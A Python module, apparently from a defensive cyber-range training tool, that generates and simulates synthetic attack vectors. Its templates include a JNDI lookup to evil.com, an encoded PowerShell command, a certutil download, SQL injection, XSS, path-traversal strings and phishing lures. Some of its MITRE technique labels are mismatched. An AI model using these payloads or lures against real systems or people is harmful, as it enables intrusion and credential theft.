"""
Ultra-minimal implementation with zero external dependencies.

This module provides the absolute minimal functionality using only Python standard library
to ensure the system works even in the most constrained environments.
"""

import json
import uuid
import random
import re
import logging
from typing import List, Dict, Optional, Union, Any, Tuple
from dataclasses import dataclass, asdict
from pathlib import Path
from datetime import datetime
import base64
import hashlib
import time

logger = logging.getLogger(__name__)


@dataclass
class AttackVector:
    """Represents a synthetic attack vector with metadata"""
    attack_type: str
    payload: Union[str, bytes, Dict]
    techniques: List[str]
    severity: float
    stealth_level: float
    target_systems: List[str]
    timestamp: Optional[str] = None
    metadata: Optional[Dict] = None
    attack_id: Optional[str] = None

    def __post_init__(self):
        if self.attack_id is None:
            self.attack_id = str(uuid.uuid4())
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()


class UltraMinimalGenerator:
    """Ultra-minimal attack generator using only Python standard library"""
    
    def __init__(self, attack_types: List[str] = None):
        self.attack_types = attack_types or ["malware", "network", "web", "social_engineering"]
        self.attack_patterns = self._initialize_patterns()
        self.generation_history = []
        random.seed(int(time.time()))
        
    def _initialize_patterns(self) -> Dict[str, List[Dict]]:
        """Initialize rule-based attack patterns"""
        return {
            "malware": [
                {"template": "powershell -enc {encoded_payload}", "severity": 0.8, "stealth": 0.6},
                {"template": "cmd.exe /c {command}", "severity": 0.7, "stealth": 0.4},
                {"template": "rundll32.exe {dll_path},{function}", "severity": 0.9, "stealth": 0.8},
                {"template": "certutil -urlcache -split -f {url} {file}", "severity": 0.6, "stealth": 0.7},
                {"template": "wmic process call create \"{command}\"", "severity": 0.8, "stealth": 0.5},
            ],
            "network": [
                {"template": "ping -t {target_ip}", "severity": 0.2, "stealth": 0.8},
                {"template": "telnet {target_ip} {port}", "severity": 0.4, "stealth": 0.6},
                {"template": "nc -nv {target_ip} {port}", "severity": 0.5, "stealth": 0.5},
                {"template": "curl -I http://{target_ip}:{port}", "severity": 0.3, "stealth": 0.7},
            ],
            "web": [
                {"template": "' OR '1'='1' --", "severity": 0.8, "stealth": 0.4},
                {"template": "<script>alert('xss')</script>", "severity": 0.6, "stealth": 0.3},
                {"template": "../../../etc/passwd", "severity": 0.7, "stealth": 0.5},
                {"template": "1'; DROP TABLE users; --", "severity": 0.9, "stealth": 0.2},
                {"template": "${jndi:ldap://evil.com/exp}", "severity": 0.9, "stealth": 0.6},
            ],
            "social_engineering": [
                {"template": "Your account has been compromised. Click here: {phish_url}", "severity": 0.9, "stealth": 0.8},
                {"template": "IT Support: Please provide your password", "severity": 0.8, "stealth": 0.6},
                {"template": "Urgent security update required: {malware_url}", "severity": 0.7, "stealth": 0.7},
                {"template": "Your package is ready for delivery: {tracking_url}", "severity": 0.6, "stealth": 0.9},
            ]
        }
    
    def generate(
        self, 
        num_samples: int = 10,
        attack_type: Optional[str] = None,
        diversity_threshold: float = 0.5
    ) -> List[AttackVector]:
        """Generate synthetic attack vectors using rule-based approach"""
        
        logger.info(f"Generating {num_samples} attack vectors")
        
        if num_samples <= 0:
            return []
        
        generated_attacks = []
        
        for i in range(num_samples):
            # Select attack type
            if attack_type and attack_type in self.attack_patterns:
                selected_type = attack_type
            else:
                selected_type = random.choice(self.attack_types)
            
            # Select pattern
            patterns = self.attack_patterns[selected_type]
            pattern = random.choice(patterns)
            
            # Generate payload
            payload = self._generate_payload(pattern, selected_type)
            
            # Add noise to severity and stealth
            severity = max(0.0, min(1.0, pattern["severity"] + random.uniform(-0.1, 0.1)))
            stealth = max(0.0, min(1.0, pattern["stealth"] + random.uniform(-0.1, 0.1)))
            
            # Create attack vector
            attack = AttackVector(
                attack_type=selected_type,
                payload=payload,
                techniques=self._get_techniques(selected_type, payload),
                severity=round(severity, 2),
                stealth_level=round(stealth, 2),
                target_systems=self._get_target_systems(selected_type),
                metadata={
                    "generation_method": "ultra_minimal",
                    "pattern_used": pattern["template"],
                    "generator_version": "ultra_minimal_v1.0",
                    "sequence_number": i + 1
                }
            )
            
            # Validate and add
            if self._is_valid_attack(attack):
                generated_attacks.append(attack)
                
        self.generation_history.append({
            "timestamp": datetime.now().isoformat(),
            "num_requested": num_samples,
            "num_generated": len(generated_attacks),
            "attack_types": list(set(a.attack_type for a in generated_attacks))
        })
        
        logger.info(f"Successfully generated {len(generated_attacks)} valid attacks")
        return generated_attacks
    
    def _generate_payload(self, pattern: Dict, attack_type: str) -> str:
        """Generate payload from pattern template"""
        template = pattern["template"]
        
        # Replace placeholders with generated values
        replacements = {
            "encoded_payload": self._generate_encoded_payload(),
            "command": self._generate_command(),
            "dll_path": self._generate_dll_path(),
            "function": self._generate_function_name(),
            "target_ip": self._generate_target_ip(),
            "port": str(self._generate_port()),
            "url": self._generate_url(),
            "file": self._generate_filename(),
            "phish_url": self._generate_phish_url(),
            "malware_url": self._generate_malware_url(),
            "tracking_url": self._generate_tracking_url()
        }
        
        for placeholder, value in replacements.items():
            template = template.replace(f"{{{placeholder}}}", value)
        
        return template
    
    def _generate_encoded_payload(self) -> str:
        """Generate base64-like encoded payload"""
        commands = ["whoami", "net user", "ipconfig", "dir", "systeminfo"]
        payload = random.choice(commands)
        encoded = base64.b64encode(payload.encode()).decode()
        return encoded[:20] + "..."
    
    def _generate_command(self) -> str:
        commands = [
            "whoami", "ipconfig", "net user", "dir c:\\", "systeminfo",
            "tasklist", "netstat -an", "reg query HKLM", "wmic computersystem get model"
        ]
        return random.choice(commands)
    
    def _generate_dll_path(self) -> str:
        dlls = ["shell32.dll", "kernel32.dll", "user32.dll", "advapi32.dll", "ntdll.dll"]
        return f"c:\\windows\\system32\\{random.choice(dlls)}"
    
    def _generate_function_name(self) -> str:
        functions = ["ShellExecuteA", "WinExec", "CreateProcessA", "LoadLibraryA", "GetProcAddress"]
        return random.choice(functions)
    
    def _generate_target_ip(self) -> str:
        # Generate realistic internal IPs
        networks = ["192.168", "10.0", "172.16"]
        network = random.choice(networks)
        if network == "192.168":
            return f"{network}.{random.randint(1,254)}.{random.randint(1,254)}"
        else:
            return f"{network}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def _generate_port(self) -> int:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 8080]
        return random.choice(common_ports)
    
    def _generate_url(self) -> str:
        domains = ["example.com", "test-server.net", "internal-app.local"]
        return f"http://{random.choice(domains)}/update.exe"
    
    def _generate_filename(self) -> str:
        names = ["update.exe", "patch.zip", "config.dll", "data.tmp", "install.msi"]
        return random.choice(names)
    
    def _generate_phish_url(self) -> str:
        domains = [
            "secure-bank-login.com", "microsoft-update.net", "gmail-security.org",
            "paypal-verification.biz", "amazon-security.info"
        ]
        paths = ["verify", "login", "update", "confirm", "secure"]
        return f"https://{random.choice(domains)}/{random.choice(paths)}"
    
    def _generate_malware_url(self) -> str:
        domains = ["download-center.net", "software-updates.com", "security-patch.org"]
        files = ["update.exe", "patch.zip", "security_fix.msi", "driver.sys"]
        return f"https://{random.choice(domains)}/{random.choice(files)}"
    
    def _generate_tracking_url(self) -> str:
        couriers = ["ups", "fedex", "dhl", "usps"]
        tracking_id = ''.join(random.choices('0123456789ABCDEF', k=8))
        return f"https://{random.choice(couriers)}-tracking.com/{tracking_id}"
    
    def _get_techniques(self, attack_type: str, payload: str) -> List[str]:
        """Map attack to MITRE ATT&CK techniques"""
        payload_lower = payload.lower()
        
        technique_mapping = {
            "malware": {
                "powershell": ["T1059.001"],  # PowerShell
                "cmd": ["T1059.003"],         # Windows Command Shell
                "rundll32": ["T1055.001"],    # DLL Side-Loading
                "certutil": ["T1105"],        # Ingress Tool Transfer
                "wmic": ["T1047"],            # Windows Management Instrumentation
            },
            "network": {
                "ping": ["T1018"],            # Remote System Discovery
                "telnet": ["T1021.001"],      # Remote Desktop Protocol
                "nc": ["T1095"],              # Non-Application Layer Protocol
                "curl": ["T1046"],            # Network Service Scanning
            },
            "web": {
                "or": ["T1190"],              # Exploit Public-Facing Application
                "script": ["T1190"],          # Exploit Public-Facing Application  
                "..": ["T1190"],              # Exploit Public-Facing Application
                "drop": ["T1190"],            # Exploit Public-Facing Application
                "jndi": ["T1190"],            # Exploit Public-Facing Application
            },
            "social_engineering": {
                "click": ["T1566.002"],       # Spearphishing Link
                "password": ["T1110"],        # Brute Force
                "download": ["T1204.002"],    # Malicious File
                "delivery": ["T1566.002"],    # Spearphishing Link
            }
        }
        
        if attack_type in technique_mapping:
            for keyword, techniques in technique_mapping[attack_type].items():
                if keyword in payload_lower:
                    return techniques
        
        # Default techniques by attack type
        defaults = {
            "malware": ["T1059"],
            "network": ["T1046"],
            "web": ["T1190"],
            "social_engineering": ["T1566"]
        }
        
        return defaults.get(attack_type, ["T1001"])
    
    def _get_target_systems(self, attack_type: str) -> List[str]:
        """Get typical target systems for attack type"""
        targets = {
            "malware": ["windows_workstation", "windows_server", "endpoint"],
            "network": ["router", "firewall", "server", "infrastructure"],
            "web": ["web_server", "application_server", "database", "api_gateway"],
            "social_engineering": ["email_client", "web_browser", "user_workstation", "mobile_device"]
        }
        
        return targets.get(attack_type, ["generic_target"])
    
    def _is_valid_attack(self, attack: AttackVector) -> bool:
        """Validate generated attack vector"""
        # Check required fields
        if not attack.payload or len(str(attack.payload)) < 3:
            return False
        
        if not attack.techniques:
            return False
        
        if not attack.target_systems:
            return False
        
        # Ensure bounds
        if not (0.0 <= attack.severity <= 1.0):
            return False
        
        if not (0.0 <= attack.stealth_level <= 1.0):
            return False
        
        return True
    
    def diversity_score(self, attacks: List[AttackVector]) -> float:
        """Calculate diversity score based on attack types and payloads"""
        if len(attacks) < 2:
            return 0.0
        
        # Type diversity
        unique_types = set(attack.attack_type for attack in attacks)
        type_diversity = len(unique_types) / len(self.attack_types)
        
        # Payload diversity (simple string comparison)
        payloads = [str(attack.payload) for attack in attacks]
        unique_payloads = len(set(payloads))
        payload_diversity = unique_payloads / len(payloads)
        
        # Technique diversity
        all_techniques = []
        for attack in attacks:
            all_techniques.extend(attack.techniques)
        unique_techniques = len(set(all_techniques))
        technique_diversity = min(1.0, unique_techniques / 10)  # Normalize
        
        # Combined score
        diversity = (type_diversity + payload_diversity + technique_diversity) / 3
        return round(diversity, 3)
    
    def save_attacks(self, attacks: List[AttackVector], path: Union[str, Path]) -> None:
        """Save generated attacks to file"""
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)
        
        attack_data = {
            "metadata": {
                "generated_at": datetime.now().isoformat(),
                "generator": "UltraMinimalGenerator", 
                "version": "1.0",
                "total_attacks": len(attacks)
            },
            "attacks": [asdict(attack) for attack in attacks]
        }
        
        with open(path, 'w') as f:
            json.dump(attack_data, f, indent=2)
        
        logger.info(f"Saved {len(attacks)} attacks to {path}")
    
    def load_attacks(self, path: Union[str, Path]) -> List[AttackVector]:
        """Load attacks from file"""
        path = Path(path)
        
        with open(path, 'r') as f:
            data = json.load(f)
        
        attacks = []
        for attack_dict in data.get("attacks", []):
            attacks.append(AttackVector(**attack_dict))
        
        logger.info(f"Loaded {len(attacks)} attacks from {path}")
        return attacks


class UltraMinimalCyberRange:
    """Ultra-minimal cyber range for testing basic functionality"""
    
    def __init__(self):
        self.range_id = str(uuid.uuid4())
        self.status = "initializing"
        self.attack_generator = UltraMinimalGenerator()
        self.event_log = []
        self.start_time = None
        
    def deploy(self, **kwargs) -> str:
        """Mock deployment"""
        self.status = "deployed"
        self.event_log.append({
            "timestamp": datetime.now().isoformat(),
            "event": "range_deployed",
            "range_id": self.range_id
        })
        logger.info(f"Ultra-minimal cyber range {self.range_id} deployed")
        return self.range_id
    
    def start(self) -> None:
        """Start the mock range"""
        self.status = "running"
        self.start_time = datetime.now()
        self.event_log.append({
            "timestamp": self.start_time.isoformat(),
            "event": "range_started"
        })
        logger.info("Ultra-minimal cyber range started")
    
    def stop(self) -> None:
        """Stop the range"""
        self.status = "stopped"
        self.event_log.append({
            "timestamp": datetime.now().isoformat(),
            "event": "range_stopped"
        })
        logger.info("Ultra-minimal cyber range stopped")
    
    def generate_attacks(self, num_attacks: int = 5) -> List[AttackVector]:
        """Generate attacks using ultra-minimal generator"""
        return self.attack_generator.generate(num_attacks)
    
    def execute_attack(self, attack: AttackVector) -> Dict[str, Any]:
        """Mock attack execution with realistic simulation"""
        execution_time = random.uniform(0.5, 10.0)
        
        # Simulate success based on stealth level
        success_probability = attack.stealth_level * 0.8 + 0.1
        success = random.random() < success_probability
        
        # Simulate detection based on stealth level (inverse relationship)  
        detection_probability = (1.0 - attack.stealth_level) * 0.6 + 0.1
        detected = random.random() < detection_probability
        
        result = {
            "attack_id": attack.attack_id,
            "status": "completed",
            "execution_time": round(execution_time, 2),
            "success": success,
            "detected": detected,
            "severity_impact": attack.severity if success else 0.0,
            "timestamp": datetime.now().isoformat()
        }
        
        self.event_log.append({
            "timestamp": datetime.now().isoformat(),
            "event": "attack_executed",
            "attack_id": attack.attack_id,
            "attack_type": attack.attack_type,
            "result": result
        })
        
        return result
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get comprehensive mock metrics"""
        attack_events = [e for e in self.event_log if e["event"] == "attack_executed"]
        
        # Calculate detection rate
        if attack_events:
            detected_count = sum(1 for e in attack_events if e["result"]["detected"])
            detection_rate = detected_count / len(attack_events)
        else:
            detection_rate = 0.0
        
        # Calculate success rate
        if attack_events:
            success_count = sum(1 for e in attack_events if e["result"]["success"])
            success_rate = success_count / len(attack_events)
        else:
            success_rate = 0.0
        
        # Calculate uptime
        uptime_seconds = 0
        if self.start_time:
            uptime_seconds = (datetime.now() - self.start_time).total_seconds()
        
        uptime_str = f"{int(uptime_seconds//3600):02d}:{int((uptime_seconds%3600)//60):02d}:{int(uptime_seconds%60):02d}"
        
        return {
            "range_id": self.range_id,
            "status": self.status,
            "uptime": uptime_str,
            "uptime_seconds": round(uptime_seconds, 1),
            "attacks_executed": len(attack_events),
            "detection_rate": round(detection_rate, 3),
            "success_rate": round(success_rate, 3),
            "total_events": len(self.event_log),
            "resource_usage": {
                "cpu": round(random.uniform(15.0, 45.0), 1),
                "memory": round(random.uniform(256.0, 1024.0), 1), 
                "network": round(random.uniform(50.0, 300.0), 1),
                "disk": round(random.uniform(10.0, 80.0), 1)
            }
        }
    
    def get_attack_summary(self) -> Dict[str, Any]:
        """Get summary of executed attacks"""
        attack_events = [e for e in self.event_log if e["event"] == "attack_executed"]
        
        summary = {
            "total_attacks": len(attack_events),
            "by_type": {},
            "by_success": {"successful": 0, "failed": 0},
            "by_detection": {"detected": 0, "undetected": 0}
        }
        
        for event in attack_events:
            attack_type = event.get("attack_type", "unknown")
            result = event["result"]
            
            # Count by type
            summary["by_type"][attack_type] = summary["by_type"].get(attack_type, 0) + 1
            
            # Count by success
            if result["success"]:
                summary["by_success"]["successful"] += 1
            else:
                summary["by_success"]["failed"] += 1
            
            # Count by detection
            if result["detected"]:
                summary["by_detection"]["detected"] += 1
            else:
                summary["by_detection"]["undetected"] += 1
        
        return summary


class UltraMinimalDemo:
    """Ultra-minimal demo for defensive cybersecurity training"""
    
    def __init__(self):
        self.threat_patterns = [
            {"type": "reconnaissance", "severity": 0.3, "technique": "T1046"},
            {"type": "credential_access", "severity": 0.7, "technique": "T1110"},
            {"type": "lateral_movement", "severity": 0.8, "technique": "T1021"},
            {"type": "exfiltration", "severity": 0.9, "technique": "T1041"}
        ]
        self.generator = UltraMinimalGenerator()
        self.cyber_range = UltraMinimalCyberRange()
    
    def detect_threats(self) -> List[Dict]:
        """Simulate threat detection"""
        detected = []
        for pattern in self.threat_patterns:
            if random.random() > 0.3:  # 70% detection rate
                detected.append({
                    **pattern,
                    "detected_at": datetime.now().isoformat(),
                    "confidence": round(random.uniform(0.6, 0.95), 2)
                })
        return detected
    
    def generate_defense_recommendations(self, threats: List[Dict]) -> List[str]:
        """Generate defensive recommendations"""
        recommendations = []
        
        for threat in threats:
            if threat["type"] == "reconnaissance":
                recommendations.append("Deploy network monitoring and IDS")
            elif threat["type"] == "credential_access":
                recommendations.append("Implement MFA and password policies")
            elif threat["type"] == "lateral_movement":
                recommendations.append("Network segmentation and privilege management")
            elif threat["type"] == "exfiltration":
                recommendations.append("Data loss prevention and encryption")
        
        return list(set(recommendations))
    
    def run(self) -> Dict:
        """Run comprehensive defensive demo"""
        start_time = time.time()
        
        # Initialize cyber range
        range_id = self.cyber_range.deploy()
        self.cyber_range.start()
        
        # Generate synthetic attacks for training
        synthetic_attacks = self.generator.generate(num_samples=8)
        
        # Simulate execution for training
        attack_results = []
        for attack in synthetic_attacks:
            result = self.cyber_range.execute_attack(attack)
            attack_results.append(result)
        
        # Simulate threat detection
        detected_threats = self.detect_threats()
        
        # Generate recommendations
        recommendations = self.generate_defense_recommendations(detected_threats)
        
        # Calculate metrics
        total_threats = len(self.threat_patterns)
        detected_count = len(detected_threats)
        detection_rate = detected_count / total_threats if total_threats > 0 else 0
        
        # Get range metrics
        range_metrics = self.cyber_range.get_metrics()
        attack_summary = self.cyber_range.get_attack_summary()
        
        # Calculate diversity
        diversity = self.generator.diversity_score(synthetic_attacks)
        
        end_time = time.time()
        
        return {
            "status": "defensive_demo_completed",
            "execution_time": round(end_time - start_time, 3),
            "cyber_range_id": range_id,
            "threats_analyzed": total_threats,
            "threats_detected": detected_count,
            "detection_rate": round(detection_rate, 2),
            "synthetic_attacks_generated": len(synthetic_attacks),
            "attack_diversity_score": diversity,
            "attack_execution_results": attack_results,
            "range_metrics": range_metrics,
            "attack_summary": attack_summary,
            "defense_recommendations": recommendations,
            "timestamp": datetime.now().isoformat()
        }


def validate_ultra_minimal_functionality() -> bool:
    """Validate that ultra-minimal functionality works"""
    try:
        logger.info("Starting ultra-minimal functionality validation")
        
        # Test attack generation
        generator = UltraMinimalGenerator()
        attacks = generator.generate(num_samples=10)
        
        if len(attacks) != 10:
            logger.error(f"Expected 10 attacks, got {len(attacks)}")
            return False
        
        logger.info(f"✓ Generated {len(attacks)} attacks")
        
        # Test different attack types
        for attack_type in generator.attack_types:
            type_attacks = generator.generate(num_samples=2, attack_type=attack_type)
            if len(type_attacks) != 2 or not all(a.attack_type == attack_type for a in type_attacks):
                logger.error(f"Failed to generate {attack_type} attacks correctly")
                return False
        
        logger.info("✓ All attack types generated successfully")
        
        # Test diversity calculation
        diversity = generator.diversity_score(attacks)
        if not (0.0 <= diversity <= 1.0):
            logger.error(f"Invalid diversity score: {diversity}")
            return False
        
        logger.info(f"✓ Diversity score calculated: {diversity}")
        
        # Test cyber range
        cyber_range = UltraMinimalCyberRange()
        range_id = cyber_range.deploy()
        cyber_range.start()
        
        if cyber_range.status != "running":
            logger.error(f"Range status should be 'running', got '{cyber_range.status}'")
            return False
        
        logger.info("✓ Cyber range deployed and started")
        
        # Test attack execution
        test_attacks = cyber_range.generate_attacks(num_attacks=5)
        results = []
        for attack in test_attacks:
            result = cyber_range.execute_attack(attack)
            results.append(result)
            if not result or "attack_id" not in result:
                logger.error("Attack execution failed")
                return False
        
        logger.info(f"✓ Executed {len(results)} attacks")
        
        # Test metrics
        metrics = cyber_range.get_metrics()
        if not metrics or "attacks_executed" not in metrics:
            logger.error("Failed to get metrics")
            return False
        
        if metrics["attacks_executed"] != 5:
            logger.error(f"Expected 5 executed attacks, got {metrics['attacks_executed']}")
            return False
        
        logger.info("✓ Metrics retrieved successfully")
        
        # Test attack summary
        summary = cyber_range.get_attack_summary()
        if summary["total_attacks"] != 5:
            logger.error(f"Expected 5 total attacks in summary, got {summary['total_attacks']}")
            return False
        
        logger.info("✓ Attack summary generated")
        
        # Test persistence
        temp_file = Path("/tmp/test_attacks.json")
        generator.save_attacks(attacks, temp_file)
        
        if not temp_file.exists():
            logger.error("Failed to save attacks")
            return False
        
        loaded_attacks = generator.load_attacks(temp_file)
        if len(loaded_attacks) != len(attacks):
            logger.error("Failed to load attacks correctly")
            return False
        
        temp_file.unlink()  # Clean up
        logger.info("✓ Save/load functionality works")
        
        logger.info("✓ All ultra-minimal functionality tests passed!")
        return True
        
    except Exception as e:
        logger.error(f"Ultra-minimal functionality validation failed: {e}")
        import traceback
        traceback.print_exc()
        return False


if __name__ == "__main__":
    # Run validation
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    success = validate_ultra_minimal_functionality()
    exit(0 if success else 1)